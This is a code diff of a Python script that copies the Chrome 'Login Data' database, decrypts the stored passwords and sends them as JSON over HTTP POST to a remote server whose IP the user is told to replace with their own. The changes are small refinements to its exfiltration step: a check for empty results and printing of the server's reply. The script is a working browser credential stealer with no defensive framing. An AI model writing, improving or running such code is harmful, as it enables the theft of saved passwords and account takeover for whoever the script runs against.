@@ -50,13 +50,11 @@ def decrypt_password(password, key):
             return ""
 
 def main():
-    # Server URL where data will be sent
-    SERVER_URL = "http://192.168.0.4:8000/receive" # change with your linux server IP
-    
+    SERVER_URL = "http://192.168.0.4:8000/receive"  # change with you linux server ip
+
     key = get_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "default", "Login Data")
-    
     filename = "ChromeData.db"
     shutil.copyfile(db_path, filename)
     
@@ -93,11 +91,14 @@ def main():
         pass
 
     # Send data to server
-    try:
-        response = requests.post(SERVER_URL, json=credentials)
-        print(f"Data sent. Server response: {response.status_code}")
-    except Exception as e:
-        print(f"Failed to send data: {e}")
+    if credentials:
+        try:
+            response = requests.post(SERVER_URL, json=credentials)
+            print(f"Data sent. Server response: {response.status_code} - {response.json()}")
+        except Exception as e:
+            print(f"Failed to send data: {e}")
+    else:
+        print("No credentials found.")
 
 if __name__ == "__main__":
     main()
